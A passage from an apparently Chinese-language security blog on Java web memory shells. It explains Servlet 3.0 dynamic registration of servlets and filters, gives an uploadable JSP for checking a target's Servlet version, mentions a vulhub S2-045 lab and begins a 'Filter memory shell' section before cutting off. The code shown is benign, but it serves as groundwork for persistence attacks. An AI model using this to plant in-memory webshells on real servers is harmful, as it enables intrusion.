style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> {</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">                response</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">getWriter</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">().</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">println</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;Hello from Dynamic Servlet!&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">            }</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">        });</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">        // 2. 配置 Servlet</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">        dynamicServlet</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">setLoadOnStartup</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">); </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">// 设置优先级为启动时加载</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">        dynamicServlet</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">addMapping</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;/dynamic&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">); </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">// 映射到 /dynamic 路由</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    }</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><code>ServletRegistration.Dynamic</code> 是 Servlet 3.0 规范引入的一个接口，它允许开发者在应用启动时通过 <code>ServletContext</code> 动态注册 <code>Servlet</code>。使用这个接口，你可以在代码中添加、配置和管理 <code>Servlet</code>，而不是依赖传统的 <code>web.xml</code> 配置文件。</p><ul><li><code>ServletRegistration.Dynamic</code> 是 <code>ServletRegistration</code> 接口的一个子接口，专门用于动态注册 <code>Servlet</code>。它提供了用于配置 <code>Servlet</code> 的方法，比如设置 URL 映射、初始化参数等。</li><li>通过调用 <code>ServletContext</code> 的 <code>addServlet()</code> 方法，可以得到一个 <code>ServletRegistration.Dynamic</code> 对象，用于进一步配置和映射动态注册的 <code>Servlet</code>。</li></ul><p>你可以在 Web 应用启动时（通常是在 <code>ServletContextListener</code> 或 <code>ServletContainerInitializer</code> 中）使用 <code>ServletContext</code> 的 <code>addServlet()</code> 方法来注册新的 <code>Servlet</code>，并通过 <code>ServletRegistration.Dynamic</code> 接口进行配置</p><p>示例代码:</p><div class="language-java line-numbers-mode" data-highlighter="shiki" data-ext="java" data-title="java" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">import</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> javax.servlet.ServletContext</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">import</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> javax.servlet.ServletException</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">import</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> javax.servlet.ServletRegistration</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">import</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> javax.servlet.http.HttpServlet</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">import</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> javax.servlet.http.HttpServletRequest</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">import</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> javax.servlet.http.HttpServletResponse</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">import</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> java.io.IOException</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">public</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> class</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> MyServletInitializer</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> {</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">    public</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> void</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> onStartup</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">ServletContext</span><span style="--shiki-light:#383A42;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic;"> servletContext</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> throws</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> ServletException</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> {</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">        // 1. 动态注册一个 Servlet</span></span>
<span class="line"><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">        ServletRegistration</span><span style="--shiki-light:#E45649;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">Dynamic</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> dynamicServlet</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;"> servletContext</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">addServlet</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;MyDynamicServlet&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">new</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> HttpServlet</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">() {</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">            protected</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> void</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> doGet</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">HttpServletRequest</span><span style="--shiki-light:#383A42;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic;"> request</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">HttpServletResponse</span><span style="--shiki-light:#383A42;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic;"> response</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> throws</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> ServletException</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> IOException</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> {</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">                response</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">getWriter</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">().</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">println</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;Hello from Dynamic Servlet!&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">            }</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">        });</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">        // 2. 配置 Servlet</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">        dynamicServlet</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">setLoadOnStartup</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">); </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">// 设置优先级为启动时加载</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">        dynamicServlet</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">addMapping</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;/dynamic&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">); </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">// 映射到 /dynamic 路由</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    }</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><code>ServletRegistration.Dynamic</code> 提供了一些常用方法来配置 <code>Servlet</code>，包括：</p><ul><li><p><strong><code>setLoadOnStartup(int loadOnStartup)</code></strong>：设置 <code>Servlet</code> 的启动加载顺序</p><ul><li><p>参数值为正数时表示启动时加载，值越小优先级越高</p></li><li><p>0 或负数表示在首次请求时再加载。</p></li></ul></li><li><p><strong><code>addMapping(String... urlPatterns)</code></strong>：为 <code>Servlet</code> 添加 URL 路由映射</p><p>可以通过这个方法将 <code>Servlet</code> 绑定到一个或多个 URL 上。</p></li><li><p><strong><code>setAsyncSupported(boolean isAsyncSupported)</code></strong>：</p><p>指定该 <code>Servlet</code> 是否支持异步处理。此 Servlet 需要处理长时间运行的任务（例如长轮询或 WebSocket），可以将异步支持设置为 <code>true</code></p></li><li><p><strong><code>setInitParameter(String name, String value)</code></strong>：动态设置 <code>Servlet</code> 的初始化参数</p></li></ul></li></ul><hr><p>Servlet 3.0 引入了动态注册的功能，使得在 Web 应用启动时可以动态地向 <code>ServletContext</code> 注册 <code>Servlet</code>、<code>Filter</code> 和 <code>Listener</code>。这意味着开发者可以在代码中直接添加这些组件，而不必依赖传统的 <code>web.xml</code> 配置文件。</p><ul><li><p><code>ServletContext</code> 提供了一系列方法，如 <code>addServlet()</code>、<code>addFilter()</code> 和 <code>addListener()</code>，这些方法允许开发者在代码中注册新的 <code>Servlet</code>、<code>Filter</code> 或 <code>Listener</code>。</p><p>这些方法可以在 Web 应用启动时或特定条件下调用，从而允许开发者按需创建和配置这些组件。</p></li></ul><p><img src="http://cdn.ayusummer233.top/DailyNotes/202409231703391.png" alt="img"></p><hr><h4 id="如何确认项目是否是-servlet-3-0-以上的项目" tabindex="-1"><a class="header-anchor" href="#如何确认项目是否是-servlet-3-0-以上的项目"><span>如何确认项目是否是 Servlet 3.0 以上的项目</span></a></h4><ul><li><p><strong>检查依赖项</strong></p><p>检查项目的依赖项是否包含 Servlet 3.0 或更高版本的依赖。通常，这可以通过以下方式来确认：</p><ul><li><p><strong>Maven 项目</strong>：查看 <code>pom.xml</code> 中的 <code>javax.servlet-api</code> 版本</p><div class="language-xml line-numbers-mode" data-highlighter="shiki" data-ext="xml" data-title="xml" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">dependency</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">groupId</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;javax.servlet&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">groupId</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">artifactId</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;javax.servlet-api&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">artifactId</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">version</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;3.0.1&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">version</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;  </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">&lt;!-- 确保版本是 3.0 或更高 --&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">scope</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;provided&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">scope</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">dependency</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li><li><p><strong>Gradle 项目</strong>：查看 <code>build.gradle</code> 文件中的依赖配置。</p><div class="language-groovy line-numbers-mode" data-highlighter="shiki" data-ext="groovy" data-title="groovy" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">dependencies {</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    providedCompile </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;javax.servlet:javax.servlet-api:3.0.1&#39;</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">  // 确保版本是 3.0 或更高</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li></ul></li><li><p><strong>查看 Web 容器版本</strong></p><p>Servlet API 是由 Web 容器实现的，检查项目使用的 Web 容器是否支持 Servlet 3.0 或更高版本。例如：</p><ul><li><strong>Tomcat 7</strong> 或更高版本支持 Servlet 3.0。</li><li><strong>Jetty 9</strong> 支持 Servlet 3.0</li></ul><p>如果项目部署在这些支持 Servlet 3.0 的容器中，通常项目也是基于 Servlet 3.0。</p></li><li><p><strong>检查 <code>web.xml</code></strong></p><p>如果项目使用 <code>web.xml</code> 进行配置，检查 <code>web.xml</code> 文件的 <code>version</code> 属性。Servlet 3.0 的 <code>web.xml</code> 版本号应为 <code>3.0</code> 或更高。</p><div class="language-xml line-numbers-mode" data-highlighter="shiki" data-ext="xml" data-title="xml" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">web-app</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> xmlns</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">         xmlns:xsi</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">         xsi:schemaLocation</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;http://xmlns.jcp.org/xml/ns/javaee</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">                             http://xmlns.jcp.org/xml/ns/javaee/web-app_3_0.xsd&quot;</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">         version</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;3.0&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    &lt;!-- 配置项 --&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">web-app</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li><li><p><strong>使用注解</strong></p><p>如果项目中使用了注解来定义 <code>Servlet</code>、<code>Filter</code> 或 <code>Listener</code>，说明项目至少是基于 Servlet 3.0，因为这是 3.0 版本引入的新特性。</p><p>如果在项目中看到类似 <code>@WebServlet</code>、<code>@WebFilter</code> 或 <code>@WebListener</code> 的注解，项目很可能是 Servlet 3.0。</p></li></ul><p>上面都是直接从后端确认项目是否是 Servlet3.0+ 的项目的方案, 如果能写/上传文件的话也可以用如下 JSP 文件来查看:</p><div class="language-jsp line-numbers-mode" data-highlighter="shiki" data-ext="jsp" data-title="jsp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot;%&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;javax.servlet.ServletContext&quot; %&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;javax.servlet.annotation.WebServlet&quot; %&gt;</span></span>
<span class="line"><span>&lt;!DOCTYPE html&gt;</span></span>
<span class="line"><span>&lt;html&gt;</span></span>
<span class="line"><span>&lt;head&gt;</span></span>
<span class="line"><span>    &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span>
<span class="line"><span>    &lt;title&gt;Servlet Version Check&lt;/title&gt;</span></span>
<span class="line"><span>&lt;/head&gt;</span></span>
<span class="line"><span>&lt;body&gt;</span></span>
<span class="line"><span>    &lt;h1&gt;Servlet Version Information&lt;/h1&gt;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>    &lt;%</span></span>
<span class="line"><span>        // 获取 ServletContext 对象</span></span>
<span class="line"><span>        ServletContext servletContext = request.getServletContext();</span></span>
<span class="line"><span></span></span>
<span class="line"><span>        // 获取 Servlet 版本</span></span>
<span class="line"><span>        int majorVersion = servletContext.getMajorVersion();</span></span>
<span class="line"><span>        int minorVersion = servletContext.getMinorVersion();</span></span>
<span class="line"><span>        boolean isServlet30Plus = majorVersion &gt;= 3;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>        // 获取 Servlet 容器的版本信息</span></span>
<span class="line"><span>        String serverInfo = servletContext.getServerInfo();</span></span>
<span class="line"><span></span></span>
<span class="line"><span>        // 检查是否支持注解（Servlet 3.0+ 才支持 @WebServlet 等注解）</span></span>
<span class="line"><span>        boolean supportsAnnotations = servletContext.getClass().isAnnotationPresent(WebServlet.class);</span></span>
<span class="line"><span></span></span>
<span class="line"><span>        // 检查是否支持异步处理</span></span>
<span class="line"><span>        boolean supportsAsync = servletContext.getEffectiveMajorVersion() &gt;= 3;</span></span>
<span class="line"><span>        // 获取当前Web应用实际使用的 Servlet 版本</span></span>
<span class="line"><span>        int effectiveMajorVersion = servletContext.getEffectiveMajorVersion();</span></span>
<span class="line"><span>        int effectiveMinorVersion = servletContext.getEffectiveMinorVersion();</span></span>
<span class="line"><span>        </span></span>
<span class="line"><span>        // 输出结果</span></span>
<span class="line"><span>        out.println(&quot;&lt;p&gt;&lt;strong&gt;Servlet Version(Servlet容器支持的Servlet版本号):&lt;/strong&gt; &quot; + majorVersion + &quot;.&quot; + minorVersion + &quot;&lt;/p&gt;&quot;);</span></span>
<span class="line"><span>        out.println(&quot;&lt;p&gt;&lt;strong&gt;Servlet Container Info:&lt;/strong&gt; &quot; + serverInfo + &quot;&lt;/p&gt;&quot;);</span></span>
<span class="line"><span>        out.println(&quot;&lt;p&gt;&lt;strong&gt;当前 ServletContext 类本身是否有 @WebServlet 注解 - Annotations (@WebServlet, etc.):&lt;/strong&gt; &quot; + (supportsAnnotations ? &quot;Yes&quot; : &quot;No&quot;) + &quot;&lt;/p&gt;&quot;);</span></span>
<span class="line"><span>        out.println(&quot;&lt;p&gt;&lt;strong&gt;Effective Servlet Version(当前Web应用实际使用的Sevlet规范版本[基于web.xml判断]):&lt;/strong&gt; &quot; + effectiveMajorVersion + &quot;.&quot; + effectiveMinorVersion + &quot;&lt;/p&gt;&quot;);</span></span>
<span class="line"><span>    %&gt;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>&lt;/body&gt;</span></span>
<span class="line"><span>&lt;/html&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202409231701665.png" alt="image-20240923170139551"></p><blockquote><p>这是 vulhub 的 s2-045 的 docker 环境, 其中的 Jetty 9.2.11 本身是支持 Servlet3.0+ 的, 不过 Web.xml 定义的 Servlet 规范是 2.3, 因此实际上是不能用 3.0+ 的特性的</p></blockquote><hr><h3 id="filter-内存马" tabindex="-1"><a class="header-anchor" href="#filter-内存马"><span>Filter 内存马</span></a></h3><blockquote><p><a href="https://su18.org/post/memory-shell/#filter-%E5%86%85%E5%AD%98%E9%A9%AC" target="_blank" rel="noopener noreferrer">JavaWeb 内存马一周目通关攻略 | 素十八 (su18.org)</a></p></blockquote><p>Filter 我们称之为过滤器，是 Java 中最常见也最实用的技术之一，通常被用来处理静态 web 资源、访问权限控制、记录日志等附加功能等等。一次请求进入到服务器后，将先由 Filter 对用户请求进行预处理，再交给 Servlet。</p><p>通常情况下，Filter 配置在配置文件(<code>web.xml</code>)和注解(如 <code>@WebFilter</code>)中，在其他代码中如果想要完成注册，主要有以下几种方式：</p><ul><li><p>使用 <code>ServletContext</code> 的 <code>addFilter/createFilter</code> 方法注册</p><p>例如:</p><div class="language-java line-numbers-mode" data-highlighter="shiki" data-ext="java" data-title="java" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">FilterRegistration</span><span style="--shiki-light:#E45649;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">Dynamic</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> filter </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;"> servletContext</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">addFilter</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;myFilter&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">new</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> MyFilter</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">());</span></span>
